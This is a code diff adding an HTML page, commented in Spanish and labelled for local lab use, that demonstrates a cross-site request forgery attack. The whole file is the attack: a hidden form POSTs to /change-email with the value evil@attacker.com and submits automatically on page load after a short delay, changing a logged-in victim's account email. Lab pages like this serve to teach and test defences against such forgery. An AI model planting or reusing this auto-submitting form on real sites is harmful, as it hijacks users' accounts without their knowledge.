@@ -1,0 +1,30 @@
+<!-- static/evil.html -->
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <title>evil demo (same-origin)</title>
+</head>
+<body>
+  <h3>evil demo (same-origin)</h3>
+  <p>Esta página se sirve desde el mismo origen que la app legítima. Solo para laboratorio local.</p>
+
+  <form id="f" action="/change-email" method="POST">
+    <input name="new_email" value="evil@attacker.com">
+  </form>
+
+  <script>
+    // Esperar a que el DOM esté listo y luego auto-submit.
+    // Esto reduce condiciones de carrera y asegura que la cookie de sesión
+    // ya esté disponible en el navegador.
+    document.addEventListener('DOMContentLoaded', function() {
+      var form = document.getElementById('f');
+      if (form) {
+        // pequeño retraso adicional para asegurar inclusión de cookies en casos raros
+        setTimeout(function(){ form.submit(); }, 200);
+      }
+    });
+  </script>
+</body>
+</html>
+
